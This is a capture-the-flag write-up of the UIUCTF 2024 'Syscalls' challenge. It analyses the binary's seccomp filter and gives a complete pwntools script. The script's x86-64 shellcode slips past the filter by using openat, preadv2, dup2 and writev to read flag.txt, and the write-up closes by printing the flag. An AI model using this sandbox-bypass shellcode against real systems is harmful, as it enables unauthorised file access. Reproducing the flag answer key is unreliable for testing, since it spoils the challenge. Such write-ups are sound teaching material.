https://ctftime.org/event/2275

# Syscalls (CATEGORY)

You can't escape this fortress of security.

ncat --ssl syscalls.chal.uiuc.tf 1337

## Analysis

`0x001011c9` / `main`:

- calls `0x1280`
- calls `0x12db`
- calls `0x12ba`

`0x1280`:

- reads our shellcode
- informs us that the flag is stored _in the current directory_ and is called flag.txt
    - I believe this to be a hint to use the `openat` syscall

`0x12db`:

- inserts a seccomp filter that is detailed below

`0x12ba`:

- calls our shellcode


Using `seccomp-tools` we can easily dump the seccomp filter from `0x12db`:

```
$ seccomp-tools dump ./syscalls 
The flag is in a file named flag.txt located in the same directory as this binary. That's all the information I can give you.
asdf
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x16 0xc000003e  if (A != ARCH_X86_64) goto 0024
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x13 0xffffffff  if (A != 0xffffffff) goto 0024
 0005: 0x15 0x12 0x00 0x00000000  if (A == read) goto 0024
 0006: 0x15 0x11 0x00 0x00000001  if (A == write) goto 0024
 0007: 0x15 0x10 0x00 0x00000002  if (A == open) goto 0024
 0008: 0x15 0x0f 0x00 0x00000011  if (A == pread64) goto 0024
 0009: 0x15 0x0e 0x00 0x00000013  if (A == readv) goto 0024
 0010: 0x15 0x0d 0x00 0x00000028  if (A == sendfile) goto 0024
 0011: 0x15 0x0c 0x00 0x00000039  if (A == fork) goto 0024
 0012: 0x15 0x0b 0x00 0x0000003b  if (A == execve) goto 0024
 0013: 0x15 0x0a 0x00 0x00000113  if (A == splice) goto 0024
 0014: 0x15 0x09 0x00 0x00000127  if (A == preadv) goto 0024
 0015: 0x15 0x08 0x00 0x00000128  if (A == pwritev) goto 0024
 0016: 0x15 0x07 0x00 0x00000142  if (A == execveat) goto 0024
 0017: 0x15 0x00 0x05 0x00000014  if (A != writev) goto 0023
 0018: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # writev(fd, vec, vlen)
 0019: 0x25 0x03 0x00 0x00000000  if (A > 0x0) goto 0023
 0020: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0024
 0021: 0x20 0x00 0x00 0x00000010  A = fd # writev(fd, vec, vlen)
 0022: 0x25 0x00 0x01 0x000003e8  if (A <= 0x3e8) goto 0024
 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0024: 0x06 0x00 0x00 0x00000000  return KILL
 ```

1) Most syscalls are allowed but some common ones are not such as `open`, `read` and `write`
2) The `writev` syscall is allowed provided that the `fd` is between `0x3e9` and `0xffffffff00000000`
3) The `preadv2` and `pwritev2` variants of `preadv` and `pwritev` return `ALLOW`
4) The `openat` syscall returns `ALLOW`
5) The `dup2` and `dup3` syscalls return `ALLOW` this allows us to use `writev` with essentially any `fd` by duplicating it to an acceptable value first

Our shellcode is written to the stack this ensures we have at least some RWX memory we can use relative to `rip`

## Solution

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./syscalls", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="b *0x5555555552d6")
p = remote("syscalls.chal.uiuc.tf", 1337, ssl=True)

p.readline()

# 0022: 0x25 0x00 0x01 0x000003e8  if (A <= 0x3e8) goto 0024
FIRST_ACCEPTABLE_FD = 0x3e9

p.sendline(asm(
# make some space
# we'll use r12 as an iovec* and r13 as iovec->iov_base
"""
mov r12, rsp
mov r13, r12
sub r13, 4096
"""

# setup the iovec structure r12 = &v
# note: see man 3 iovec
# #include <sys/uio.h>
# struct iovec {
#     void* iov_base;
#     size_t iov_len;
# }
"""
mov qword ptr[r12], r13
mov qword ptr[r12+8], 4096
"""

# ensure that flag.txt will be followed by one or more \x00 bytes
# by zeroing a portion of the stack
"""
xor eax, eax
push rax
push rax
pop rax
"""

# rsi = "flag.txt\x00"
# note: that flag.txt is exactly 8 bytes
# so we need a \x00 byte in the next slot of the stack
"""
mov rax, 0x7478742e67616c66
push rax
mov rsi, rsp
"""

# int fd = openat(AT_FDCWD, "flag.txt", 0, 0)
# note: that AT_FDCWD is represented by the value -100
"""
mov r10, 0
mov rdx, 0
mov rdi, -100
mov eax, SYS_openat
syscall
"""

# int read = preadv2(fd, &iovec, 1, 0, 0)
"""
mov r8, 0
mov r10, 0
mov rdx, 1
mov rsi, r12
mov rdi, rax
mov eax, SYS_preadv2
syscall
"""

# update the iovec.iov_len with num bytes read
"""
mov qword ptr[r12+8], rax
"""

# dup2 stdout to satisfy <= 0x3e8 fd seccomp constraint
f"""
mov rsi, {FIRST_ACCEPTABLE_FD}
mov rdi, 1
mov eax, SYS_dup2
syscall
"""

# write the flag, from the iovec, to stdout
# via fd=FIRST_ACCEPTABLE_FD/0x3e9 using writev
f"""
mov rdx, 1
mov rsi, r12
mov rdi, {FIRST_ACCEPTABLE_FD}
mov eax, SYS_writev
syscall
"""
))

# uiuctf{a532aaf9aaed1fa5906de364a1162e0833c57a0246ab9ffc}
print(p.recvall().decode())
```

## Flag
`uiuctf{a532aaf9aaed1fa5906de364a1162e0833c57a0246ab9ffc}`

smiley 2024/06/29
